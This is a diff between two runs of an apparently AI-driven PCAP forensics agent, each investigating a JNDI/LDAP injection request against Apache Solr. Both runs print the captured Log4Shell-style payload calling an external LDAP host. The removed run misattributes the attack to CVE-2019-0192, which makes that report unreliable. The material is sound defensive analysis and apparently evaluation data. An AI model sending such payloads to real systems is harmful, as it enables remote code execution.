@@ -1,52 +1,46 @@
 [Task 6]
-Step 1: The PCAP summary indicates a TCP conversation between two IP addresses on port 8983. This port is commonly associated with Apache Solr, a popular open-source search platform. However, to confirm the service or application involved, I need to analyze the traffic further to identify any specific application signatures or protocols.
+Step 1: The PCAP summary indicates a TCP conversation between two IP addresses on port 8983. This port is commonly associated with Apache Solr, a popular open-source search platform. However, to confirm the service or application involved, I need to extract more detailed information from the PCAP file, such as HTTP requests or specific application-layer data that can confirm the presence of Apache Solr or another service.
 
-Next, I will extract HTTP requests and their headers from the PCAP file to verify if Apache Solr or another service is running on port 8983. This will help in identifying the service or application involved.
+Let's proceed by extracting HTTP requests and their headers from the PCAP file to identify the service or application involved. This will help confirm whether Apache Solr is indeed the service running on port 8983 or if another application is using this port.
+
+I'll ask the "tshark_expert" to extract HTTP requests and their headers from the PCAP file.
 Step 2: Final report from the forensic expert:
-The analysis of the PCAP file revealed an HTTP request to `localhost:8983` with the URI `/solr/admin/cores?action=$%7Bjndi:ldap://8qvsbr.sdasda1212.cn%7D`, indicating a potential exploitation attempt involving Apache Solr. The request suggests an attempt to perform a JNDI injection attack. Attempts to extract additional HTTP response headers, such as the `Server` field, resulted in no output, indicating that the server did not include this information in its responses or the service on port 8983 does not provide it.
-Executed command: -Y "http.response" -T fields -e http.server
+The analysis of the PCAP file revealed an HTTP GET request targeting a Solr service, as indicated by the URI `/solr/admin/cores?action=$%7Bjndi:ldap://8qvsbr.sdasda1212.cn%7D`. This request suggests a potential exploitation attempt using JNDI with an LDAP server. The HTTP request headers were successfully extracted, showing the request method, host, user agent, and request URI. However, attempts to extract the raw payload of the HTTP request did not yield any output, possibly due to the absence of raw data in the request or incorrect field usage. The executed command for extracting HTTP requests and headers was successful, while the command for extracting raw payload data did not provide results.
+Executed command: -Y "http.request" -T fields -e http.request.method -e http.host -e http.user_agent -e http.request.uri
+
+Command output: GET	localhost:8983	Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.69 Safari/537.36	/solr/admin/cores?action=$%7Bjndi:ldap://8qvsbr.sdasda1212.cn%7D
+
+
+Step 3: The HTTP GET request targeting the Solr service with the URI `/solr/admin/cores?action=$%7Bjndi:ldap://8qvsbr.sdasda1212.cn%7D` suggests a potential exploitation attempt using JNDI with an LDAP server. This pattern is reminiscent of the Log4Shell vulnerability (CVE-2021-44228), which involves exploiting JNDI lookups in log messages to execute remote code.
+
+To confirm this, I need to perform a web search to verify if this pattern is indeed associated with a known CVE, specifically Log4Shell, and gather more information about it. 
+
+I'll proceed with a web search to confirm the CVE and gather additional details.
+Step 4: Search result for query: 'CVE associated with JNDI LDAP Solr exploitation'
+Information 1: nd external data sources that indicate a massive increase in traffic, demonstrating scanning/exploitation attempts targeting the JNDI and LDAP services (e.g., jndi:ldap://:/).7 Log4j2 is a ubiquitous package contained in numerous Apache frameworks (including Struts2, Solr, Druid and Flink) that are, in turn, leveraged by an indeterminate number of third parties.8 Depending on respective implementation, server configuration, network architecture, and other factors, the reliability of CVE-2021-44228 exploits 
+Information 2: dStrike Intelligence assesses that numerous adversaries have been conducting active, widespread exploitation of CVE-2021-44228 since Dec. 9, 2021. This assessment is made with high confidence based on the trivial nature of the exploit as well as internal and external data sources that indicate a massive increase in traffic, demonstrating scanning/exploitation attempts targeting the JNDI and LDAP services (e.g., jndi:ldap://:/).7 Log4j2 is a ubiquitous package contained in numerous Apache frameworks (includi
+Information 3: cious JNDI lookup string with LDAP. The log4j library is a powerful log framework with very flexible features supported. However, convenient features often involve potential security issues at the same time. Without careful user input filtering and strict input data sanitization, a blind trust of user input may lead to severe security issues. Exploit Exploit code for the CVE-2021-44228 vulnerability has been made publicly available. Any user input hosted by a Java application using the vulnerable version of
+Information 4: cations. Specifically, as per CVE-2021-44228, Apache Log4j2 JNDI features used in configuration, log messages, and parameters do not protect against attacker-controlled LDAP and other JNDI related endpoints. In detail, Log4j provides a ‘Java Naming and Directory Interface'(JNDI) functionality used to retrieve variables and keys from JNDI resources using the jndiLookup class. However, this functionality may expose Web applications into a critical situation which provokes the potential of remote command execu
+Information 5: ng Struts2, Solr, Druid and Flink) that are, in turn, leveraged by an indeterminate number of third parties.8 Depending on respective implementation, server configuration, network architecture, and other factors, the reliability of CVE-2021-44228 exploits may be impacted. The vulnerability leverages JNDI,9 which provides an abstract interface for different name resolution and directory services, such as DNS or LDAP.10 Log4j2 insufficiently sanitizes user-supplied data, potentially allowing an attacker to pr
+Step 5: 
+Step 6: Stored memory ee795dcc-3f49-45e8-8760-f7955a61f338
+Step 7: The analysis of the PCAP file and the subsequent web search have confirmed that the HTTP GET request targeting the Solr service with the URI `/solr/admin/cores?action=$%7Bjndi:ldap://8qvsbr.sdasda1212.cn%7D` is associated with the Log4Shell vulnerability (CVE-2021-44228). This vulnerability involves exploiting JNDI lookups in log messages to execute remote code.
+
+Now, I need to gather evidence of malicious activities associated with this CVE from the PCAP file. This involves looking for signs of remote code execution attempts or any other suspicious activities that could indicate an exploitation attempt.
+
+I'll ask the "tshark_expert" to look for signs of remote code execution attempts or any other suspicious activities in the PCAP file.
+Step 8: Final report from the forensic expert:
+The analysis of the PCAP file revealed a suspicious HTTP request with a URI pattern indicative of an attempted remote code execution using JNDI with an LDAP server. This is a known method for exploiting vulnerabilities like Log4Shell. The HTTP response indicated a '400 Bad Request,' suggesting the server did not process the request successfully. Attempts to extract raw payload data from the TCP stream did not yield any output, indicating no further payloads were exchanged. The executed command to extract raw data in hexadecimal format from the TCP stream returned no output, confirming the absence of additional suspicious data.
+Executed command: -Y "tcp.stream eq 0" -T fields -e data
 
 Command output: No output found for the given command.
 
-Step 3: 
-Step 4: Stored memory 2c8d5c6a-6548-4acc-b83e-f8c2e87b9c13
-Step 5: The analysis of the PCAP file has revealed a potential JNDI injection attack attempt on Apache Solr, as indicated by the HTTP request to `localhost:8983` with the URI `/solr/admin/cores?action=$%7Bjndi:ldap://8qvsbr.sdasda1212.cn%7D`. This suggests an attempt to exploit a vulnerability in Apache Solr. To proceed, I need to identify the relevant CVE associated with this type of attack on Apache Solr.
-
-Next, I will perform a web search to find the CVE associated with JNDI injection attacks on Apache Solr.
-Step 6: Search result for query: 'CVE JNDI injection Apache Solr'
-Information 1: peration, so we can exploit it as an ordinary JNDI resolution attack. See our Exploiting JNDI Injections article for more information about JNDI attacks. Solr is based on Jetty, hence the Tomcat trick is not applicable here, but you can rely on remote classloading which was fixed for LDAP just quite recently. 4. [CVE-2012-6612, CVE-2013-6407, CVE-2013-6408] XXE in the Update Handler Target Solr version: 1.3 - 4.1 or 4.3.1 Requirements: none If you have a very old version of Solr, it could also be affected b
-Information 2: way we trigger a deserialization attack with the known gadget chain based on the 'com.sun.rowset.JdbcRowSetImpl' class. It requires two setters to be called for 'jndiName' and 'autoCommit' properties and leads us to the vulnerable 'InitialContext.lookup' operation, so we can exploit it as an ordinary JNDI resolution attack. See our Exploiting JNDI Injections article for more information about JNDI attacks. Solr is based on Jetty, hence the Tomcat trick is not applicable here, but you can rely on remote clas
-Information 3: 2.14.1. Access http://your-ip:8983 to view the Apache Solr backend page. Vulnerability Reproduction Here we use logXj to set up another VPS as the LDAP server (LOGXJ SERVER) and start listening to the TCP service. Intrusion Tracing This vulnerability has obvious characteristics. Search the logs for the keyword jndi:ldap for investigation. Remediation Check if the application has introduced the Apache log4j-core Jar package. If there is a dependency introduced and it is within the affected version range, it 
-Information 4: a direct access to JMX [CVE-2019-0193] Remote Code Execution via dataImportHandler [CVE-2012-6612, CVE-2013-6407, CVE-2013-6408] XXE in the Update Handler [CVE-2013-6397] Remote Code execution via XSLT response writer and path traversal [CVE-2017-3163] Arbitrary file read via path traversal attack in ReplicationHandler [CVE-2019-17558] RCE via Velocity template by @_S00pY Black box detection Mitigations Conclusion Introduction This research is aimed to present a new vulnerability: "Solr parameter Injection"
-Information 5: teLatest commit History12 Commitsimagesimages slidesslides README.mdREADME.md View all filesRepository files navigationREADMEApache Solr Injection Research Table of Contents Introduction Solr API quick overview Apache Solr Injection Solr Parameters Injection (HTTP smuggling) Exploitation examples Solr Local Parameters Injection Ways to RCE [CVE-2017-12629] Remote Code Execution via RunExecutableListener [CVE-2019-0192] Deserialization of untrusted data via jmx.serviceUrl Attack via deserialization Attack vi
-Step 7: Based on the web search results, it appears that the potential JNDI injection attack on Apache Solr is associated with CVE-2019-0192, which involves deserialization of untrusted data via the `jmx.serviceUrl`. This aligns with the observed behavior in the PCAP file, where a JNDI injection attempt was made.
-
-Next, I need to gather evidence of malicious activities associated with this CVE from the PCAP file. I will instruct the "tshark_expert" to look for signs of deserialization attempts or any unusual JNDI-related traffic that could indicate exploitation attempts.
-Step 8: Final report from the forensic expert:
-The analysis focused on identifying JNDI-related traffic or deserialization attempts within the provided PCAP file. Initial attempts to detect LDAP and RMI traffic, which are commonly associated with JNDI lookups, yielded no results. Subsequently, an attempt was made to search for the string 'jndi' within the packet data. However, this attempt resulted in an error due to incorrect syntax. Despite efforts to consult the tshark manual for the correct syntax, no relevant information was found. As a result, the analysis could not conclusively identify any JNDI-related traffic or deserialization attempts in the PCAP file.
-Executed command: -Y "frame contains 'jndi'"
-
-Error in the command
-
-Step 9: The analysis of the PCAP file has indicated a potential JNDI injection attack on Apache Solr, associated with CVE-2019-0192. However, the attempt to gather evidence of malicious activities related to this CVE from the PCAP file was inconclusive due to syntax errors in the command used to search for JNDI-related traffic.
-
-To proceed, I need to reassess the approach to identify any signs of deserialization attempts or unusual JNDI-related traffic that could indicate exploitation attempts. I will instruct the "tshark_expert" to perform a more targeted analysis by looking for specific patterns or anomalies in the traffic that align with the characteristics of CVE-2019-0192.
-
-Next, I will instruct the "tshark_expert" to search for any deserialization attempts or unusual JNDI-related traffic patterns in the PCAP file.
-Step 10: Final report from the forensic expert:
-The analysis of the PCAP file revealed a suspicious HTTP GET request to the Solr admin cores endpoint with a JNDI injection attempt: `GET /solr/admin/cores?action=${jndi:ldap://8qvsbr.sdasda1212.cn}`. This is indicative of a potential exploitation attempt related to CVE-2019-0192, as it involves a JNDI lookup using LDAP, which is a common vector for deserialization attacks. The HTTP response included a JSON error message indicating an unsupported operation involving an LDAP URL, further supporting the suspicion of an exploitation attempt.
-Executed command: -Y "http" -T fields -e frame.number -e ip.src -e ip.dst -e http.request.full_uri -e http.response.code -e http.response.phrase -e http.file_data
-
-Command output: 8	172.18.0.1	172.18.0.2	http://localhost:8983/solr/admin/cores?action=$%7Bjndi:ldap://8qvsbr.sdasda1212.cn%7D			
-12	172.18.0.2	172.18.0.1	http://localhost:8983/solr/admin/cores?action=$%7Bjndi:ldap://8qvsbr.sdasda1212.cn%7D	400	Bad Request	7b0a202022726573706f6e7365486561646572223a7b0a2020202022737461747573223a3430302c0a20202020225154696d65223a32367d2c0a2020226572726f72223a7b0a20202020226d65746164617461223a5b0a202020202020226572726f722d636c617373222c226f72672e6170616368652e736f6c722e636f6d6d6f6e2e536f6c72457863657074696f6e222c0a20202020202022726f6f742d6572726f722d636c617373222c226f72672e6170616368652e736f6c722e636f6d6d6f6e2e536f6c72457863657074696f6e225d2c0a20202020226d7367223a22556e737570706f72746564206f7065726174696f6e3a206c6461703a2f2f3871767362722e736461736461313231322e636e222c0a2020202022636f6465223a3430307d7d0a
-
-
-Step 11: 
-Step 12: FINAL REPORT:
-The analysis of the PCAP file revealed a suspicious HTTP GET request to the Solr admin cores endpoint with a JNDI injection attempt: `GET /solr/admin/cores?action=${jndi:ldap://8qvsbr.sdasda1212.cn}`. This is indicative of a potential exploitation attempt related to CVE-2019-0192, as it involves a JNDI lookup using LDAP, which is a common vector for deserialization attacks. The HTTP response included a JSON error message indicating an unsupported operation involving an LDAP URL, further supporting the suspicion of an exploitation attempt. However, the attack was not successful as the server returned a 400 Bad Request error, indicating that the operation was not executed.
+Step 9: 
+Step 10: FINAL REPORT:
+The analysis of the PCAP file revealed an HTTP GET request targeting a Solr service with a URI pattern indicative of an attempted remote code execution using JNDI with an LDAP server. This is associated with the Log4Shell vulnerability (CVE-2021-44228). The HTTP response indicated a '400 Bad Request,' suggesting the server did not process the request successfully. Attempts to extract raw payload data from the TCP stream did not yield any output, indicating no further payloads were exchanged. Therefore, there is no evidence of successful exploitation or further malicious activity in the captured traffic.
 REPORT SUMMARY:
-Identified CVE: CVE-2019-0192
-Affected Service: Apache Solr
+Identified CVE: CVE-2021-44228
+Affected Service: Solr
 Is Service Vulnerable: True
 Attack succeeded: False
 
